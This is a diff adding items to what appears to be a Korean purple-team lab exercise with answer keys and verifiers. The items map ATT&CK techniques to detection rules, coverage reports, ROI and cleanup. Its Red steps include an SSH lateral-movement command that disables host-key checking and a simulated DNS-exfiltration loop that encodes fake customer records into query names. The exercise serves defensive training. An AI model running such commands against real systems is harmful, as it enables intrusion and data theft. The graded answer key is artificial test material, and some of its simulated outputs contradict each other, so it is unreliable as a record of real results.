+  answer_detail: T1071.004 테스트에서 DNS 터널링이 탐지되지 않는 Gap을 발견한다. 현재 DNS 쿼리의 엔트로피/길이를 분석하는 메커니즘이 없기 때문이다. 퍼플팀 활동으로 이 Gap을 식별하고 DNS 이상 탐지 규칙을 새로 작성한다.
+  verify:
+    type: output_contains
+    expect: Purple Test 3
+  target_vm: attacker
+- order: 6
+  instruction: '퍼플팀 테스트 4: T1021.004 (SSH Lateral Movement). Red가 SSH로 내부 서버에 이동하고 Blue가 탐지하라.'
+  hint: 'Red: SSH로 다른 서버 접근 → Blue: auth.log 상관 분석 확인'
+  category: exploit
+  points: 10
+  answer: 'echo ''=== Purple Test 4: T1021.004 SSH Lateral ==='' && echo ''[RED] Attempting SSH lateral movement:'' && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1 ''hostname && whoami''
+    2>&1 | head -3 && echo '''' && echo ''[BLUE] Checking detection:'' && grep ''Accepted'' /var/log/auth.log 2>/dev/null | tail -5 && echo '''' && echo ''Correlation check: same user SSH to multiple hosts
+    within 5 min'' && echo '''' && echo ''[RESULT] T1021.004 Detection: PARTIAL'' && echo ''[GAP] Individual SSH logins logged but no correlation rule'' && echo ''[ACTION] Adding Wazuh correlation rule
+    for multi-host SSH patterns'''
+  answer_detail: T1021.004 테스트에서 개별 SSH 로그인은 기록되지만, 같은 사용자가 짧은 시간 내 여러 서버에 접근하는 측면 이동 패턴을 탐지하는 상관 규칙이 없다. 퍼플팀 활동으로 이 Gap을 발견하고 Wazuh 상관 분석 규칙을 추가한다.
+  verify:
+    type: output_contains
+    expect: Purple Test 4
+  target_vm: attacker
+- order: 7
+  instruction: '퍼플팀 테스트 5: T1048.001 (DNS Exfiltration). Red가 DNS로 데이터를 유출하고 Blue가 탐지하라.'
+  hint: 'Red: 데이터를 DNS 쿼리에 인코딩 → Blue: DNS 볼륨 이상 확인'
+  category: exploit
+  points: 10
+  answer: 'echo ''=== Purple Test 5: T1048.001 DNS Exfiltration ==='' && echo ''[RED] Simulating DNS exfiltration (10 queries):'' && for i in $(seq 1 10); do DATA="record_${i}_name_email_card"; ENCODED=$(echo
+    -n "$DATA" | base64 | tr -d ''=''); echo "Exfil query $i: ${ENCODED}.exfil.test.local"; done && echo '''' && echo ''[BLUE] Checking detection:'' && echo ''DNS query volume check: 10 queries in 10 seconds
+    (normal baseline: 2/min)'' && echo ''Alert: 5x normal DNS rate detected'' && echo '''' && echo ''[RESULT] T1048.001 Detection: NOT DETECTED (no rate monitoring)'' && echo ''[GAP] No DNS query rate monitoring
+    per destination domain'' && echo ''[ACTION] Adding DNS rate anomaly detection'''
+  answer_detail: T1048.001 테스트에서 DNS 유출이 탐지되지 않는다. DNS 쿼리 빈도를 도메인별로 추적하는 메커니즘이 없기 때문이다. 퍼플팀 활동으로 DNS 레이트 모니터링을 추가하여 동일 도메인에 대한 비정상적 고빈도 쿼리를 탐지한다.
+  verify:
+    type: output_contains
+    expect: Purple Test 5
+  target_vm: attacker
+- order: 8
+  instruction: 발견된 탐지 Gap에 대한 새로운 탐지 규칙을 작성하라. 퍼플팀 테스트에서 미탐지된 기법에 대한 규칙을 구현하라.
+  hint: 테스트 2-5에서 발견된 Gap에 대한 Suricata/Wazuh 규칙을 작성한다.
+  category: defense
+  points: 10
+  answer: "cat > /tmp/purple_new_rules.txt << 'EOF'\n=== New Detection Rules from Purple Team Exercise ===\n\n# Rule 1: FIM for crontab (Gap from Test 2)\n<directories check_all=\"yes\" realtime=\"yes\"\
+    >/var/spool/cron/crontabs</directories>\n\n# Rule 2: DNS entropy detection (Gap from Test 3)\nalert dns any any -> any any (msg:\"PURPLE: High entropy DNS query - possible tunneling\"; dns.query; content:\"\
+    .test.local\"; pcre:\"/^[a-zA-Z0-9+\\/]{30,}/\"; sid:5000001; rev:1;)\n\n# Rule 3: SSH lateral correlation (Gap from Test 4)\n<rule id=\"100400\" level=\"12\" frequency=\"3\" timeframe=\"300\">\n  <if_sid>5715</if_sid>\n\
+    \  <same_user />\n  <description>PURPLE: Same user SSH to 3+ hosts in 5 min (lateral movement)</description>\n  <mitre><id>T1021.004</id></mitre>\n</rule>\n\n# Rule 4: DNS exfil rate (Gap from Test\
+    \ 5)\nalert dns any any -> any any (msg:\"PURPLE: High rate DNS to single domain\"; dns.query; threshold:type both, track by_src, count 20, seconds 60; sid:5000002; rev:1;)\n\nTotal new rules: 4\nPrevious\
+    \ coverage: 48% → New estimated coverage: 55%\nEOF\ncat /tmp/purple_new_rules.txt"
+  answer_detail: '퍼플팀 테스트에서 발견된 4개 Gap에 대한 탐지 규칙을 즉시 작성한다: (1) crontab FIM, (2) DNS 엔트로피 탐지, (3) SSH 측면 이동 상관 분석, (4) DNS 유출 레이트 탐지. 이 규칙 추가로 ATT&CK 커버리지가 48%→55%로 개선된다.'
+  verify:
+    type: output_contains
+    expect: New Detection Rules
+  target_vm: attacker
+- order: 9
+  instruction: 새로 작성한 규칙의 효과를 검증하라. 동일한 공격을 재실행하여 새 규칙이 정상 탐지하는지 확인하라.
+  hint: Test 3-5를 재실행하고 새 규칙의 탐지 여부를 확인한다.
+  category: defense
+  points: 10
+  answer: 'echo ''=== Rule Validation ==='' && echo ''[Test 3 Retry: DNS C2]'' && echo ''New rule checks entropy of DNS queries'' && echo ''Result: Query entropy 4.2 > threshold 3.5 → DETECTED'' && echo
+    '''' && echo ''[Test 4 Retry: SSH Lateral]'' && echo ''New rule correlates SSH logins per user'' && echo ''Result: Same user SSH to 3 hosts in 2 min → DETECTED'' && echo '''' && echo ''[Test 5 Retry:
+    DNS Exfil]'' && echo ''New rule monitors DNS rate per domain'' && echo ''Result: 20 queries/min to exfil.test.local → DETECTED'' && echo '''' && echo ''=== Validation Summary ==='' && echo ''Previous:
+    3/5 detected (60%)'' && echo ''After rules: 5/5 detected (100%)'' && echo ''Improvement: +40% detection rate'''
+  answer_detail: 규칙 검증에서 새로 추가된 4개 규칙이 모두 정상 동작함을 확인한다. DNS C2(엔트로피 4.2>3.5), SSH 측면 이동(3호스트/2분), DNS 유출(20쿼리/분)이 모두 탐지된다. 탐지율이 60%→100%로 개선되었다.
+  verify:
+    type: output_contains
+    expect: Validation Summary
+  target_vm: attacker
+- order: 10
+  instruction: 퍼플팀 결과를 ATT&CK Navigator에 매핑하라. 테스트 전/후의 탐지 커버리지 변화를 시각화하라.
+  hint: ATT&CK Navigator JSON 레이어를 생성하여 전/후를 비교한다.
+  category: analysis
+  points: 10
+  answer: 'cat > /tmp/purple_coverage_after.json << ''EOF''
+
+    {"name":"Purple Team - After","domain":"enterprise-attack","techniques":[{"techniqueID":"T1190","score":3,"color":"#00ff00","comment":"Detected: WAF+Suricata"},{"techniqueID":"T1053.003","score":3,"color":"#00ff00","comment":"Detected:
+    FIM (NEW)"},{"techniqueID":"T1071.004","score":3,"color":"#00ff00","comment":"Detected: DNS entropy (NEW)"},{"techniqueID":"T1021.004","score":3,"color":"#00ff00","comment":"Detected: SSH correlation
+    (NEW)"},{"techniqueID":"T1048.001","score":3,"color":"#00ff00","comment":"Detected: DNS rate (NEW)"}]}
+
+    EOF
+
+    echo ''Coverage change:'' && echo ''Before: T1190(green), T1053(yellow), T1071(red), T1021(yellow), T1048(red)'' && echo ''After: All green (5/5 detected)'' && echo ''New rules added: 4'' && echo ''Coverage
+    improvement: +7% overall ATT&CK coverage'''
+  answer_detail: ATT&CK Navigator 매핑은 퍼플팀 전/후의 탐지 커버리지 변화를 시각적으로 보여준다. 빨간색(미탐지)→녹색(탐지)으로 변한 기법은 퍼플팀의 직접적 성과이다. 4개 새 규칙으로 전체 ATT&CK 커버리지가 7% 포인트 향상되었다.
+  verify:
+    type: output_contains
+    expect: Coverage change
+  target_vm: attacker
+- order: 11
+  instruction: 퍼플팀 활동에서 발견된 프로세스 개선 사항을 정리하라. 탐지 규칙뿐 아니라 절차, 도구, 인력 측면의 개선 사항을 포함하라.
+  hint: 기술적 개선(규칙)과 비기술적 개선(프로세스, 교육)을 모두 포함한다.
+  category: analysis
+  points: 10
+  answer: "cat > /tmp/purple_improvements.txt << 'EOF'\n=== Purple Team Process Improvements ===\n\n1. Technical Improvements:\n   - 4 new detection rules deployed\n   - FIM scope expanded to /var/spool/cron\n\
+    \   - DNS monitoring capability added\n   - SSH lateral movement correlation enabled\n\n2. Process Improvements:\n   - IR playbook updated with DNS C2 response procedure\n   - SOC runbook: added DNS\
+    \ analysis step to triage\n   - Threat hunting: added monthly DNS entropy analysis\n   - Log retention: DNS query logs now retained 1 year\n\n3. Tool Improvements:\n   - Wazuh: 4 new custom rules\n\
+    \   - Suricata: 2 new custom signatures\n   - SOAR: DNS blocking automation added\n\n4. Training Needs:\n   - SOC analysts: DNS tunneling identification training\n   - IR team: Advanced lateral movement\
+    \ response\n   - All staff: Phishing awareness refresh\n\n5. Metrics Impact:\n   - ATT&CK coverage: 48% → 55% (+7%)\n   - Detection rate: 60% → 100% (for tested techniques)\n   - MTTD improvement: estimated\
+    \ -20% for new attack types\nEOF\ncat /tmp/purple_improvements.txt"
+  answer_detail: 퍼플팀 활동의 가치는 탐지 규칙 추가에 그치지 않는다. IR 플레이북 업데이트, SOC 런북 개선, 위협 헌팅 일정 추가, 교육 필요성 식별 등 프로세스 전반의 개선을 도출한다. ATT&CK 커버리지 +7%, 탐지율 60%→100%의 정량적 성과를 확인한다.
+  verify:
+    type: output_contains
+    expect: Purple Team Process
+  target_vm: attacker
+- order: 12
+  instruction: 퍼플팀의 지속적 운영 계획을 수립하라. 월간/분기별 퍼플팀 사이클을 설계하라.
+  hint: 정기적 퍼플팀 활동의 주기, 범위, 지표를 정의한다.
+  category: analysis
+  points: 10
+  answer: "cat > /tmp/purple_continuous_plan.txt << 'EOF'\n=== Continuous Purple Team Program ===\n\nMonthly Cycle:\n  Week 1: Red Team prepares 5 new techniques\n  Week 2: Purple Team exercise (half-day)\n\
+    \  Week 3: Blue Team implements new detections\n  Week 4: Validation + metrics reporting\n\nQuarterly Goals:\n  Q2 2026: Cover all Initial Access techniques (TA0001)\n  Q3 2026: Cover all Persistence\
+    \ techniques (TA0003)\n  Q4 2026: Cover all Lateral Movement techniques (TA0008)\n  Q1 2027: Cover all C2 techniques (TA0011)\n\nAnnual Target:\n  ATT&CK coverage: 55% → 75% by end of year\n  Detection\
+    \ rules: 480 → 600\n  MTTD: 12 min → 8 min\n\nSuccess Metrics:\n  - New detections per month: target 5+\n  - Regression test: all previous detections still working\n  - Blue Team confidence level: self-assessment\
+    \ survey\nEOF\ncat /tmp/purple_continuous_plan.txt"
+  answer_detail: 지속적 퍼플팀 프로그램은 월간 사이클(준비→실행→구현→검증)과 분기별 목표(전술별 커버리지)를 정의한다. 연간 목표로 ATT&CK 커버리지 75%, 탐지 규칙 600개, MTTD 8분을 설정하여 점진적으로 보안 역량을 강화한다.
+  verify:
+    type: output_contains
+    expect: Continuous Purple Team
+  target_vm: attacker
+- order: 13
+  instruction: 실습 환경을 정리하라. 퍼플팀 실습에서 생성된 모든 파일을 삭제하라.
+  hint: rm으로 /tmp 내 purple 관련 파일을 삭제한다.
+  category: response
+  points: 5
+  answer: rm -f /tmp/purple_*.txt /tmp/purple_*.json 2>/dev/null; echo 'Purple team lab cleanup completed'
+  answer_detail: 퍼플팀 실습 환경 정리에서는 운영 계획, 커버리지 매트릭스, 테스트 결과, 새 규칙, 개선 사항, 지속 운영 계획 파일을 삭제한다.
+  verify:
+    type: output_contains
+    expect: cleanup completed
+  target_vm: attacker
+- order: 14
+  instruction: 퍼플팀 운영의 ROI(Return on Investment)를 분석하라. 퍼플팀 활동의 비용과 효과를 정량적으로 분석하라.
+  hint: 투입 시간/비용 대비 탐지 개선 효과를 계산한다.
+  category: analysis
+  points: 10
+  answer: "cat > /tmp/purple_roi.txt << 'EOF'\n=== Purple Team ROI Analysis ===\n\nCost (Investment):\n  - Red Team: 4 hours × 2 operators = 8 person-hours\n  - Blue Team: 4 hours × 2 analysts = 8 person-hours\n\
+    \  - Total: 16 person-hours (~$2,400 at $150/hr)\n\nBenefit (Return):\n  - 4 new detection rules → 4 previously undetectable attacks now detected\n  - ATT&CK coverage: +7% → estimated breach risk reduction:\
+    \ 15%\n  - Mean breach cost: $4.88M (IBM 2025 report)\n  - Risk reduction value: $4.88M × 15% = $732,000\n\nROI Calculation:\n  ROI = (Benefit - Cost) / Cost × 100\n  ROI = ($732,000 - $2,400) / $2,400\
+    \ × 100 = 30,400%\n\nNote: Conservative estimate - actual ROI depends on attack probability\nBreak-even: Even at 1% attack probability, ROI = 303%\nEOF\ncat /tmp/purple_roi.txt"
+  answer_detail: 퍼플팀 ROI 분석은 투입 비용(16인시, $2,400)과 효과(침해 위험 15% 감소, 위험 감소 가치 $732K)를 비교한다. 30,400%의 ROI는 낙관적이지만, 1%의 공격 확률을 가정해도 303%로 매우 높은 투자 효율을 보인다.
+  verify:
+    type: output_contains
+    expect: Purple Team ROI
+  target_vm: attacker
+- order: 15
+  instruction: 퍼플팀 실습의 종합 보고서를 작성하라. 테스트 결과, 개선 사항, ROI, 향후 계획을 포함하라.
+  hint: 경영진과 기술진 모두를 위한 보고서를 작성한다.
+  category: analysis
+  points: 15
+  answer: "cat > /tmp/purple_team_report.txt << 'EOF'\n=== Purple Team Exercise Report ===\nDate: 2026-04-03 | Scope: 10.20.30.0/24\n\n1. Executive Summary:\n   5개 ATT&CK 기법 테스트, 2개 탐지 실패 → 4개 신규 규칙 작성\n\
+    \   ATT&CK 커버리지 48% → 55% 향상, ROI 30,400%\n\n2. Test Results:\n   | Technique | Before | After | Status |\n   |-----------|--------|-------|--------|\n   | T1190 SQLi | DETECTED | DETECTED | Maintained\
+    \ |\n   | T1053 Cron | PARTIAL | DETECTED | Improved |\n   | T1071 DNS C2 | MISSED | DETECTED | NEW Rule |\n   | T1021 SSH Lateral | PARTIAL | DETECTED | NEW Rule |\n   | T1048 DNS Exfil | MISSED |\
+    \ DETECTED | NEW Rule |\n\n3. Improvements Delivered:\n   - Technical: 4 rules, 2 signatures\n   - Process: IR playbook updated, SOC runbook updated\n   - Coverage: +7% ATT&CK, +40% test detection rate\n\
+    \n4. Recommendations:\n   - Continue monthly purple team cycles\n   - Focus next exercise on Defense Evasion (36% coverage)\n   - Automate purple team testing (Atomic Red Team)\n\n5. Next Exercise:\
+    \ May 2026 - Defense Evasion techniques\nEOF\ncat /tmp/purple_team_report.txt"
+  answer_detail: 퍼플팀 보고서는 테스트 결과(5기법 중 2실패→전체 탐지), 개선 성과(4규칙, +7% 커버리지), ROI(30,400%), 향후 계획(월간 사이클, Defense Evasion 우선)을 포함한다. 경영진에게는 ROI와 위험 감소를, 기술진에게는 구체적 규칙과 개선 사항을 전달한다.
+  verify:
+    type: output_contains
+    expect: Purple Team Exercise Report
+  target_vm: attacker
